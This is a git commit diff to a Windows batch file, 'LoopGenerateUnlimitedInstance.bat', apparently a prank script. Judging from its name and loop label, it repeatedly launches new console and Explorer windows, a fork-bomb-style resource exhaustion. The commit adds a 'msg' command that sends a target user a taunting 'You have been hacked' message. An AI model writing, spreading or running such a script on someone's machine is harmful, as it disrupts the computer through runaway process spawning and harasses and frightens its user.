1bc5a845a706c280580b02d6cc63398de152d3c9
nwy140 <nwy140@gmail.com>
2017-09-14 09:39:52 +0800

    Update LoopGenerateUnlimitedInstance.bat

--- LoopGenerateUnlimitedInstance.bat
+++ LoopGenerateUnlimitedInstance.bat
@@ -1,4 +1,8 @@
 :loop2
+REM Your Username here
+msg Username You have been hacked,  a noob like you stands no chance against me 
+
+
 start
 REM Your directory path here
 start explorer C:\Windows\System32
